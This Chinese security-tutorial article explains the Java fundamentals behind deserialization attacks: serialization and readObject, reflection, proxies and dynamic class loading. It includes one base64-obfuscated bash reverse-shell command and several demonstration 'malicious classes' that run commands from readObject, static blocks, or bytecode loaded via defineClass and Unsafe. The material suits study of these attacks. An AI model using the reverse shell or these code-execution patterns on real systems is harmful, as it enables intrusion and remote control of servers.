> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/t81n92VPzqy6liEYOAgzNw)

免责声明

  

  

**本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**只供对已授权的目标使用测试，对未授权目标的测试作者不承担责任，均由使用本人自行承担。**

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

文章正文

  

  

> 欢迎投稿原创文章，投稿两篇原创技术文章可免费获得《Z2O 安全攻防》知识星球一年使用权限
> 
> 本文来自 Z2O 安全交流群 --@**kill3r**
> 
> ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xm9k1UlMr7j1opz7aF7Fia7y1M9lkyPMQ037IiamUiciaIiczUrFPe8e9sk2w/640?wx_fmt=png)

什么是序列化和反序列化
-----------

> 在编程语言的世界当中, 常常有这样的需求, 我们需要将本地已经**实例化**的某个**对象**, 通过**网络**传递到其他机器当中. 为了满足这种需求, 就有了所谓的序列化和反序列化
> 
> 1.  1. 序列化: 将内存中的某个对象压缩成**字节流**的形式
>     
> 2.  2. 反序列化: 将**字节流**转化成内存中的对象
>     

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmCRkua9ia4zicE6fXTUgDPibHiajzJWqdZI102vnib62goaAU5wpSvI7fU9w/640?wx_fmt=png)

### 为什么会产生安全问题?

> 只要服务端反序列化数据, 客户端传递类的 readObject 中代码会自动执行, 给予攻击者在服务器上运行代码的能力.

### 可能的形式

1.  1. 入口类的 readObject 直接调用危险方法
    
2.  2. 入口类参数中包含可控类, 该类有危险方法, readObject 时调用
    
3.  3. 入口类参数中包含可控类, 该类又调用其他有危险方法的类, readObject 时调用
    

> 比如类型定义为 Object, 调用 equals/hashcode/toString **相同类型  同名函数**

1.  1. 构造函数 / 静态代码块等类加载时隐式执行
    

### JAVA 原生反序列化漏洞成因

> Java 中间件通常通过网络接收客户端发送的序列化数据, 而在服务端对序列化数据进行反序列化时, 会调用被序列化对象的 readObject() 方法. 而在 Java 中如果重写了某个类的方法, 就会优先调用经过修改后的方法. 如果某个对象重写了 readObject() 方法, 且在方法中能够执行任意代码, 那服务端在进行反序列化时, 也会执行相应代码

Java 序列化和反序列化基础
---------------

**需要跳出 PHP 反序列化的思想**

在 php 中序列化是将对象等转换成了字符串, 而在 Java 中则是转换成了字节流

**序列化 / 反序列化是一种思想, 并不局限于其实现的形式**

如:

*   • JAVA 内置的`writeObject()/readObject()`
    
*   • JAVA 内置的`XMLDecoder()/XMLEncoder`
    
*   • `XStream`
    
*   • `SnakeYaml`
    
*   • `FastJson`
    
*   • `Jackson`
    

出现过漏洞的组件

*   • Apache Shiro
    
*   • Apache Axis
    
*   • Weblogic
    
*   • Jboss
    
*   • Fastjson
    

**Java 中的命令执行**

```
public static void main() throws Exception{
    Runtime.getRuntime().exec("calc");
    /*
        Java中执行系统命令使用java.lang.Runtime类的exec方法
        以上函数可以弹出计算器
        getRuntime()是Runtime类中的静态方法,使用此方法获取当前java程序的Runtime(即运行时:计算机程序运行需要的代码库,框架,平台等)
        exec底层为ProcessBuilder:此类用于创建操作系统进程
        每个ProcessBuilder实例管理进程属性的集合。start()方法使用这些属性创建一个新的Process实例。start()方法可以从同一实例重复调用，以创建具有相同或相关属性的新子进程。
    */
}

```

**注意: 这里的命令执行, 并不是使用系统中的 bash 或是 cmd 进行的系统命令执行, 而是使用 JAVA 本身, 所以反弹 shell 的重定向符在 JAVA 中并不支持**

```
bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzU1NTUgMD4mMQ==}|{base64,-d}{bash,-i}

```

### 编写一个可以序列化的类

在 Java 当中, 如果一个类需要被序列化和反序列化 , 需要实现`java.io.Serializable`接口

```
/*
 * @Author: 
 * @Date: 2022-10-03 15:57:25
 * @LastEditors: 
 * @LastEditTime: 2022-10-04 14:25:05
 * @Description: 请填写简介
 */
package serializable;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;



/*
 * implements Serializable:序列化的前提,需要实现这个接口
 * Serializable:表示这个类的成员可以被序列化
 */
public class Person implements Serializable {
    private static final long serialVersionUID = 1L;
    // 添加一个 transient 关键字,则name属性不会被序列化和反序列化
    // 如果将属性设置为static,同样不会被序列化和反序列化
    // private transient String name;
    public String name;
    private int age;
    public Person(){

    }
    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    /*
     * @Override是Java5的元数据,自动加上去的一个标志,告诉你说下面这个方法是从父类/接口
     * 继承过来的,需要你重写一次,这样就可以方便你阅读,也不怕会忘记
     * @Override是伪代码,表示重写(当然不写也可以),不过写上有如下好处:
     * 1. 可以当注释用,方便阅读
     * 2. 编译器可以给你验证@Override下面的方法名是否是你父类中所有的,如果没有则报错
     * 比如你如果没写@Override而你下面的方法名又写错了,这时你的编译器是可以通过的(它以为这个方法是你的子类中自己增加的方法)
     * 使用该标记是为了增强程序在编译时候的检查,如果该方法并不是一个覆盖父类的方法,在编译时编译器就会报告错误
     */
    @Override
    public String toString() {
        return "Person{" + " + name + '\'' + ",age=" + age + '}';
    }

    private void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        /*
         * java.io.ObjectInputStream.defaultReadObject()
         * 方法用于从这个ObjectInputStream读取当前类的非静态和非瞬态字段.它间接地涉及到该类的readObject()方法的帮助.
         * 如果它被调用,则会抛出NotActiveException
         */
        objectInputStream.defaultReadObject();
        /*
         * 每个Java应用程序都有一个Runtime类的Runtime ,允许应用程序与运行应用程序的环境进行接口.当前运行时可以从getRuntime方法获得.
         */
        /*
         * exec:在具有指定环境的单独进程中执行指定的字符串命令.
         * 这是一种方便的方法. 调用表单exec(command, envp)的行为方式与调用exec(command, envp, null)完全相同 .
         */
        Runtime.getRuntime().exec("calc");
    }
}

```

我们跟进`java.io.Serializable`接口, 发现是一个空接口, 说明其作用只是为了在序列化和反序列化中做了一个类型判断. 为什么呢? 因为需要遵循非必要原则, 不需要反序列化的类就可以不用序列化了

```
 public interface Serializable{
 }

```

### 如何序列化类

Java 原生实现了一套序列化的机制, 它让我们不需要额外编写代码, 只需要实现`java.io.Serializable`接口, 并调用`ObjectOutputStream`类的`writeObject`方法即可

```
/*
 * @Author: 
 * @Date: 2022-10-03 15:56:26
 * @LastEditors: 
 * @LastEditTime: 2022-10-04 10:19:15
 * @Description: 请填写简介
 */
package serializable;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class Serializable {
    public static void serializable(Object person) throws IOException {
        /*
         * ObjectOutputStream将Java对象的原始数据类型和图形写入OutputStream.可以使用ObjectInputStream读取（重构）
         * 对象.可以通过使用流的文件来实现对象的持久存储.如果流是网络套接字流,则可以在另一个主机上或另一个进程中重构对象.
         */
        /*
         * 文件输出流是用于将数据写入到输出流File或一个FileDescriptor
         * .文件是否可用或可能被创建取决于底层平台.特别是某些平台允许一次只能打开一个文件来写入一个FileOutputStream
         * （或其他文件写入对象）.在这种情况下,如果所涉及的文件已经打开,则此类中的构造函数将失败.
         * FileOutputStream用于写入诸如图像数据的原始字节流. 对于写入字符流,请考虑使用FileWriter .
         */
        // 序列化的类
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("ser.ser"));
        /*
         * 方法writeObject用于将一个对象写入流中. 任何对象,包括字符串和数组,都是用writeObject编写的. 多个对象或原语可以写入流.
         * 必须从对应的ObjectInputstream读取对象,其类型和写入次序相同.
         */
        // 需要序列化的对象是谁?
        obj.writeObject(person);
        obj.close();
    }
    public static void main(String[] args) throws Exception{
        Person person = new Person("JiangJiYue", 22);
        serializable(person);
    }
}

```

跟进`writeObject`函数, 我们通过阅读他的注释可知: 在反序列化的过程当中, 是针对对象本身, 而非针对类的, 因为静态属性是不参与序列化和反序列化的过程的. 另外, 如果属性本身声明了`transient`关键字, 也会被忽略. 但是如果某对象继承了 A 类, 那么 A 类当中的对象的对象属性也是会被序列化和反序列化的 (前提是 A 类也实现了`java.io.Serializable`接口)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmSjz3iaVPR2unqd3FKIREZPSkcn90RJ4vXKLlpVopOHFbB4S0Wvf6iamA/640?wx_fmt=png)

### 如何反序列化类

序列化使用`ObjectOutPutStream`类, 反序列化使用的则是`ObjectInputStream`类的`readObject`方法.  
我们在之前重写了`readObject`方法, 所以会执行命令

```
/*
 * @Author: 
 * @Date: 2022-10-03 15:57:52
 * @LastEditors: 
 * @LastEditTime: 2022-10-04 10:23:07
 * @Description: 请填写简介
 */
package serializable;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class Unserializable {
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        /*
         * ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象.
         * ObjectOutputStream和ObjectInputStream可以分别为与FileOutputStream和FileInputStream一起使用的对象图提供持久性存储的应用程序.
         * ObjectInputStream用于恢复先前序列化的对象. 其他用途包括使用套接字流在主机之间传递对象,或者在远程通信系统中进行封送和解组参数和参数.
         * ObjectInputStream确保从流中创建的图中的所有对象的类型与Java虚拟机中存在的类匹配. 根据需要使用标准机制加载类.
         * 只能从流中读取支持java.io.Serializable或java.io.Externalizable接口的对象.
         */
        // 反序列化的类
        ObjectInputStream ins = new ObjectInputStream((new FileInputStream(Filename)));
        /*
         * 方法readObject用于从流中读取对象. 应使用Java的安全铸造来获得所需的类型. 在Java中,字符串和数组是对象,在序列化过程中被视为对象.
         * 读取时,需要将其转换为预期类型.
         */
        // 读出来并反序列化
        Object obj = ins.readObject();
        ins.close();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        Person person = (Person) unserialize("ser.ser");
        System.out.println(person);
    }
}

```

其实反序列化的实现就是序列化的逆过程, 会根据序列化读出数据的类型, 进行相应的处理

### serialVersionUID

> 序列化和反序列化可以理解为压缩和解压缩, 但是压缩之所以能被解压缩的前提是因为他俩的协议是一样的. 如果压缩是以四个字节为一个单位, 而解压缩以八个字节为一个单位, 就会乱套
> 
> 同样在 Java 中与协议相对的概念为:**serialVersionUID**
> 
> 当 serialVersionUID 不一致时, 反序列化会直接抛出异常
> 
> 比如设置为 1L 时序列化, 修改为 2L 时反序列化, 则会抛出异常

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmbXtwLsxKRP8ibeJK7nVBzRLlr6RkTae68qr3iavFthmNQiaQq2ZictMnAQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmH9APic76iawJ7GItuuVYibv7aMWQFo2u46FF3ic6736wqC1JticdUQuAdEw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmFWBHJGOX67g19UUHaiallsk3NoJ9tBhNS95Mqg8c6QsQlFic8yxnHXOQ/640?wx_fmt=png)

跟进代码可以发现, 针对序列化数据中的 serialVersionUID 和实际获取到类的 serialVersionUID 进行了判断, 如果不相等则抛出异常

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xm3ZmEr46xeSqUIrjYibSKXZI4eX7wF3xKWITrnCWPnAr4rx7BAVlhYxg/640?wx_fmt=png)

Java 反射
-------

> 将类的各个组成部分封装为其他对象, 这就是反射机制

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmXDs5C4eaUfuOYLZEHibyicAFdE7EOTPicpiaoartZx7TR7WGaDV2JoujZQ/640?wx_fmt=png)

### 反射的作用

> 让 Java 具有动态性
> 
> 1.  1. 修改已有对象的属性
>     
> 2.  2. 动态生成对象
>     
> 3.  3. 动态调用方法
>     
> 4.  4. 操作内部类和私有方法
>     
> 5.  5. 解耦, 提高程序的可扩展性
>     

> 在反序列化漏洞中的应用
> 
> 1.  1. 定制需要的对象
>     
> 2.  2. 通过 invoke 调用除了同名函数以外的函数
>     
> 3.  3. 通过 Class 类创建对象, 引入不能序列化的类
>     

### 获取字节码 Class 对象的三种方式

1.  1. `Source`源代码阶段:`Class.forName("全类名");`
    

> 将字节码文件加载进内存, 返回 Class 对象 **多用于配置文件, 可以将类名定义在配置文件中, 读取文件, 加载类**

1.  1. `Class`类对象阶段:`类名.class`
    

> 通过类名的属性 class 来获取 **多用于参数的传递**

1.  1. `Runtime`运行时阶段:`对象.getClass`
    

> getClass() 方法在 Object 类中定义着 多用于对象的获取字节码的方式

* 同一个字节码文件 (.class) 在一次程序运行过程中, 只会被加载一次, 不论通过哪一种方式获取的 Class 对象都是同一个 **

### Class 对象

#### Field

获取成员变量们

*   • `Field[] fields = getFields()`获取所有`public`修饰的成员变量
    
*   • `Field field = getField(String name)`获取所有`public`修饰的成员变量
    
*   • `Field[] fields = getDeclaredFields()`获取所有的成员变量
    
*   • `Field field = getDeclaredField(String name)`获取所有的成员变量
    
*   • 操作
    

*   • 获取值:`get(Object obj)`
    

```
package serializable;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class ReflectionTest {
    public static void main(String[] args) throws Exception  {
        Class cls = Class.forName("serializable.Person");
        //当我不想 newInstance初始化的时候执行空参数的构造函数的时候
        //可以通过字节码文件对象方式 getConstructor(paramterTypes) 获取到该构造函数
        //获取到Person(String name,int age) 构造函数
        // 从class里面实例化对象
        Constructor personconstructor = cls.getConstructor(String.class,int.class);
        //通过构造器对象 newInstance 方法对对象进行初始化 有参数构造函数
        Person p = (Person) personconstructor.newInstance("abc",22);
        Field name = cls.getField("name");
        System.out.println(name.get(p));
    }
}

```

```
  -  私有的会访问异常,需要在访问之前忽略访问权限修饰符的安全检查 

```

```
Field age = cls.getDeclaredField("age");
// 忽略安全检查又称为暴力反射
age.setAccessible(true);
System.out.println(age.get(p));

```

*   • 设置值:`void set(Object obj,Object value)`
    

```
name.set(p,"张三");
System.out.println(p);

```

#### Constructor

获取构造方法们

*   • `Constructor<?>[] = getConstructors()`
    
*   • `Constructor<T> = getConstructor(类<?>...parameterTypes)`
    

*   • `newInstance(Object... initargs)`: 创建对象`Person p = (Person) personconstructor.newInstance("abc",22);`
    
*   • Constructor: 构造方法
    

```
Constructor personconstructor = cls.getConstructor(String.class,int.class);
System.out.println(personconstructor);

```

```
  -  如果使用空参构造方法创建对象,操作可以简化:Class对象的`newInstance` 

```

```
Class cls = Class.forName("serializable.Person");
Object o = cls.newInstance();
System.out.println(o);

```

*   • `Constructor<?>[] = getDeclaredConstructors()`
    
*   • `Constructor<T> = getDeclaredConstructor(类<?>...parameterTypes)`
    

#### Method

获取成员方法们

*   • `Method[] = getMethods()`
    
*   • `Method = getMethod(类<?>...parameterTypes)`
    

```
Class cls = Class.forName("serializable.Person");
// 获取指定名称
Method eat_method = cls.getMethod("eat");
Object p = cls.newInstance();
// 执行方法
eat_method.invoke(p);

```

*   • `Method[] = getDeclaredMethods()`
    
*   • `Method = getDeclaredMethod(类<?>...parameterTypes)`
    
*   • 获取方法名称:`String getName`
    

```
Class cls = Class.forName("serializable.Person");
Method[] methods = cls.getMethods();
for (Method method:methods){
    System.out.println(method.getName());
}

```

#### 获取类名

*   • `String name = getName()`
    

```
Class cls = Class.forName("serializable.Person");
String className = cls.getName();
System.out.println(className);

```

### 案例

> 写一个 "框架", 可以帮我们创建任意类的对象, 并且执行其中任意方法

```
/*
 * @Author: 
 * @Date: 2022-10-04 14:11:43
 * @LastEditors: 
 * @LastEditTime: 2022-10-04 16:08:53
 * @Description: 请填写简介
 */
package serializable;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Properties;

public class ReflectionTest {
    public static void main(String[] args) throws Exception  {
        /*
        * 前提:不能改变该类的任何代码,可以创建任意类的对象,可以执行任意方法
        * 步骤:
        *       1. 将需要创建的对象的全类名和需要执行的方法定义在配置文件中
        *       2. 在程序中加载读取配置文件
        *       3. 使用反射技术来加载类文件进内存
        *       4. 创建对象
        *       5. 执行方法
        * */
        // 1.1创建Properties对象
        Properties pro = new Properties();
        // 1.2加载配置文件,转换为一个集合
        // 1.2.1获取class目录下的配置文件
        ClassLoader classLoader = ReflectionTest.class.getClassLoader();
        InputStream is = classLoader.getResourceAsStream("serializable/pro.properties");
        pro.load(is);

        // 2.获取配置文件中定义的数据
        String className = pro.getProperty("className");
        String methodName = pro.getProperty("methodName");
        // 3.加载该类进内存
        Class cls = Class.forName(className);
        // 4.创建对象
        Object obj = cls.newInstance();
        // 5.获取方法对象
        Method method = cls.getMethod(methodName);
        // 6.执行方法
        method.invoke(obj);
    }
}

```

pro.properties:

```
className=serializable.Person
methodName=eat

```

Java 代理
-------

> 定义: 为其他对象提供一种代理以控制对这个对象的访问
> 
> 代理模式是一种设计模式，可以在不修改被代理对象的基础上, 通过扩展代理类, 进行一些功能的附加与增强, 之得注意的是: **代理类和被代理类应该共同实现一个接口, 或者是共同继承某个类**
> 
> 优点:
> 
> *   • 职责清晰
>     
> *   • 高扩展, 只要实现了接口, 都可以使用代理
>     
> *   • 智能化, 动态代理、
>     

> 分类
> 
> *   • 静态代理
>     
> *   • 动态代理
>     

代理常用与记录日志的环境, 比如在代理中实现各种日志的记录  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmQP6a9PjjORLaaJmEugq6AcCRjic77D0iaHpEoXJ9iad7eYSbBOSDkAf3Q/640?wx_fmt=png)

### 静态代理

我们现在有一个接口:`IUser`  
`IUser.java`:

```
/*
 * @Author: 
 * @Date: 2022-10-11 19:40:35
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 19:40:36
 * @Description: 请填写简介
 */
package java_proxy;

public interface IUser {
    void show();
}

```

然后`Userlmpl.java`实现这个接口

```
/*
 * @Author: 
 * @Date: 2022-10-11 19:42:01
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 19:43:35
 * @Description: 请填写简介
 */
package java_proxy;

public class Userlmpl implements IUser{
    public Userlmpl() {
    }

    @Override
    // @Override是伪代码,表示重写
    public void show() {
        System.out.println("展示");
    }
}

```

假设我们现在要做一件事，就是在所有的实现类调用`show()`后增加一行输出`调用了UserProxy中的show`，那我们只需要编写代理类`UserProxy`

```
/*
 * @Author: 
 * @Date: 2022-10-11 19:45:45
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 19:46:53
 * @Description: 请填写简介
 */
package java_proxy;

public class UserProxy implements IUser{
    IUser user;

    public UserProxy() {
    }

    public UserProxy(IUser user) {
        this.user = user;
    }
    @Override
    public void show() {
        user.show();
        System.out.println("调用了UserProxy中的show");
    }
}

```

`ProxyTest.java`

```
/*
 * @Author: 
 * @Date: 2022-10-11 19:44:01
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 20:25:55
 * @Description: 请填写简介
 */

package java_proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class ProxyTest {
    public static void main(String[] args) {
        IUser user = new Userlmpl();
        // 静态代理
        IUser userProxy = new UserProxy(user);
        userProxy.show();
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmvria8Cciaz5vvJibLHxV5ia17iaPb1h9HPhbH6GxjVFsCDW4jhpyxTQliasg/640?wx_fmt=png)

  
这种模式虽然好理解，但是缺点也很明显：

*   • 会存在大量的冗余的代理类，这里演示了 1 个接口，如果有 10 个接口，就必须定义 10 个代理类。
    
*   • 不易维护，一旦接口更改，代理类和目标类都需要更改。
    

### 动态代理

> JDK 动态代理，通俗点说就是：无需声明式的创建 java 代理类，而是在运行过程中生成 "虚拟" 的代理类，被 ClassLoader 加载。从而避免了静态代理那样需要声明大量的代理类。
> 
> JDK 从 1.3 版本就开始支持动态代理类的创建。主要核心类只有 2 个：`java.lang.reflect.Proxy`和`java.lang.reflect.InvocationHandler`。
> 
> *   • JDK 动态代理采用接口代理的模式，代理对象只能赋值给接口，允许多个接口
>     

还是前面那个例子，用动态代理类去实现的代码如下：  
`Userlmpl.java`

```
/*
 * @Author: 
 * @Date: 2022-10-11 19:42:01
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 19:43:35
 * @Description: 请填写简介
 */
package java_proxy;

public class Userlmpl implements IUser{
    public Userlmpl() {
    }

    @Override
    // @Override是伪代码,表示重写
    public void show() {
        System.out.println("展示");
    }
}

```

`UserInvocationHandler.java`

```
/*
 * @Author: 
 * @Date: 2022-10-11 20:21:22
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 20:27:17
 * @Description: 请填写简介
 */
package java_proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class UserInvocationHandler implements InvocationHandler {
    IUser user;

    public UserInvocationHandler() {
    }

    public UserInvocationHandler(IUser user) {
        this.user = user;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("调用了UserInvocationHandler中的show");
        method.invoke(user, args);
        return null;
    }
}

```

`ProxyTest.java`

```
/*
 * @Author: 
 * @Date: 2022-10-11 19:44:01
 * @LastEditors: 
 * @LastEditTime: 2022-10-11 20:25:55
 * @Description: 请填写简介
 */

package java_proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class ProxyTest {
    public static void main(String[] args) {
        IUser user = new Userlmpl();
        // 动态代理
        InvocationHandler userinvhandler = new UserInvocationHandler(user);
        // 要代理的接口、类加载器,classloader、要做的事情、
        IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),
                user.getClass().getInterfaces(), userinvhandler);
        userProxy.show();
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmlyXbQqAa1n5G9qrLlYhYLaD41aZmzPEQfyG2VDsFKCvCPfJ8gial57g/640?wx_fmt=png)

Java 类的动态加载
-----------

> 类加载，即虚拟机加载. class 文件。什么时候虚拟机需要开始加载一个类呢？虚拟机对此没有规范约束，交给虚拟机把握。类加载，即虚拟机加载. class 文件。什么时候虚拟机需要开始加载一个类呢？虚拟机对此没有规范约束，交给虚拟机把握。

类加载的时候会执行代码

1.  1. 初始化: 静态代码块
    
2.  2. 实例化: 构造代码块、无参数构造函数
    

### Javac 原理

javac 是用于将源码文件. java 编译成对应的字节码文件. class。  
其步骤是：源码——> 词法分析器组件（生成 token 流）——> 语法分析器组件（语法树）——> 语义分析器组件（注解语法树）——> 代码生成器组件（字节码）

### 类加载过程

先在方法区找 class 信息，有的话直接调用，没有的话则使用类加载器加载到方法区（静态成员放在静态区，非静态成功放在非静态区），静态代码块在类加载时自动执行代码，非静态的不执行；先父类后子类，先静态后非静态；静态方法和非静态方法都是被动调用，即不调用就不执行。

类加载的流程图

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmhkiaoBye60jYW8L4mH2vwe8VZy9BOBgLDBEImSDibCFg2dRVRZNsT56w/640?wx_fmt=png)

```
/*
 * @Author: 
 * @Date: 2022-10-12 12:18:17
 * @LastEditors: 
 * @LastEditTime: 2022-10-12 12:25:28
 * @Description: 请填写简介
 */
package load_class;

public class Person {

    public String name;
    private int age;
    static {
        System.out.println("静态代码块");
    }

    public static void staticAction() {
        System.out.println("静态方法");
    }

    {
        System.out.println("构造代码块");
    }
    public Person(){
        System.out.println("无参Person");
    }

    public Person(String name, int age) {
        System.out.println("有参Person");
        this.name = name;
        this.age = age;
    }

    /*
     * @Override是Java5的元数据，自动加上去的一个标志，告诉你说下面这个方法是从父类/接口
     * 继承过来的，需要你重写一次，这样就可以方便你阅读，也不怕会忘记
     * @Override是伪代码,表示重写(当然不写也可以),
     */
    @Override
    public String toString() {
        return "Person{" + " + name + '\'' + ",age=" + age + '}';
    }

    private void action(String act){System.out.println(act);}
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmDV3rUpS6za7HJMYciaG1GKoWFQS05Hs918BNqy7ghXoYzncQulKkxAg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmktIcftMFuRXyZGy4InAeOBkcDyl8hQpm67mCCxzANCw09VWTz7k7Cw/640?wx_fmt=png)

### 动态类加载方法

**类加载可以加载任意方法, 但是反射只能反射公共的**

#### Class.forname

```
package load_class;

public class LoadClass {
    public static void main(String[] args) throws Exception{
        // 动态加载进行了初始化的操作
        Class.forName("load_class.Person");
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmUwQUEUVpdrXAJgcYC8F2ROOBzhYNFWbdxU35KIsyjZLiaMJJibnjv15Q/640?wx_fmt=png)

```
/*
 * @Author: 
 * @Date: 2022-10-12 12:17:50
 * @LastEditors: 
 * @LastEditTime: 2022-10-12 14:37:34
 * @Description: 请填写简介
 */
package load_class;

public class LoadClass {
    public static void main(String[] args) throws Exception {
        // ClassLoader是一个抽象类,不能被实例化,但是提供了一个静态方法,获取当前系统的类加载器
        ClassLoader cs = ClassLoader.getSystemClassLoader();
        // 第一个参数类名
        // 第二个参数是不进行初始化
        // 第四个参数是forName0的,所以在这不用写
        // 这种都是可以正常实例化的
        Class<?> c = Class.forName("load_class.Person", false, cs);
        // 正常的实例化
        c.newInstance();
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmg180kBvicnMlF1plibrvxMXvj9csYcoh8a6cmibCYhxrKxxbicBpHaBb1g/640?wx_fmt=png)

#### ClassLoader

```
/*
 * @Author: 
 * @Date: 2022-10-12 12:17:50
 * @LastEditors: 
 * @LastEditTime: 2022-10-12 14:40:27
 * @Description: 请填写简介
 */
package load_class;

public class LoadClass {
    public static void main(String[] args) throws Exception {
        // ClassLoader是一个抽象类,不能被实例化,但是提供了一个静态方法,获取当前系统的类加载器
        ClassLoader cs = ClassLoader.getSystemClassLoader();
        // 打印ClassLoader,看一下是什么
        // result:sun.misc.Launcher$AppClassLoader@73d16e93
        // 他是Launcher里面的一个内部类,叫做AppClassLoader
        System.out.println(cs);
    }
}

```

### 关类

#### `URLClassLoader`

`URLClassLoader`: 输入一个 URL, 从 URL 内加载一个类出来

1.  1. 构造一个恶意类
    

```
import java.io.IOException;

public class Hello {
    static  {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

```

1.  1. `javac .\Hello.java`然后将`Hello.java`删除或者移动到其他目录
    
2.  2. 编译动态加载类
    

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xm8rTRyicPmlrFEdFCkFOxO7fFa0x09GhdYKxeZ6lH3iav4js3EZNpd8wg/640?wx_fmt=png)

#### `defineClass`

`defineClass`是一个`protected`, 所以只能通过反射调用, 字节码任意加载类  
构造恶意类:`Hello.java`

```
/*
 * @Author: 
 * @Date: 2022-10-12 22:43:33
 * @LastEditors: 
 * @LastEditTime: 2022-10-13 08:27:39
 * @Description: 请填写简介
 */
package load_class;

public class Hello {
    public Hello() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}

```

动态加载:`LoadClass.java`

```
        ClassLoader cl = ClassLoader.getSystemClassLoader();
        Method defineClassMethod =  ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\LearningWorld\\PersonalProject\\PersonalProject\\Java\\基础语法\\src\\load_class\\Hello.class"));
        Class c = (Class) defineClassMethod.invoke(cl,"load_class.Hello",code,0,code.length);
        c.newInstance();

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmufiaP5EkibYDk0icyS8yuA4g89oDCkJvaibD64uxnZHSMCXRPaUWYU8SpA/640?wx_fmt=png)

#### `Unsafe`

`Unsafe`中也含有`defineClass`字节码任意加载类

```
/*
 * @Author: 
 * @Date: 2022-10-12 12:17:50
 * @LastEditors: 
 * @LastEditTime: 2022-10-13 20:19:06
 * @Description: 请填写简介
 */
package load_class;

import sun.misc.Launcher;
import sun.misc.Unsafe;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;

public class LoadClass {
    public static void main(String[] args) throws Exception {
        ClassLoader cl = ClassLoader.getSystemClassLoader();
        byte[] code = Files.readAllBytes(Paths
                .get("D:\\LearningWorld\\PersonalProject\\PersonalProject\\Java\\基础语法\\src\\load_class\\Hello.class"));
        Class c = Unsafe.class;
        Field theUnsafeField = c.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
        Class c2 = unsafe.defineClass("load_class.Hello", code, 0, code.length, cl, null);
        c2.newInstance();
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmJLocicJHLYwplcjgrP31MSdWhWwIZ9XhHIzT1gQkRiaeuiaZIdoNXMWKg/640?wx_fmt=png)

Map 集合
------

集合又称**容器**, 是 Java 中对数据结构 (数据存储方式) 的具体实现  
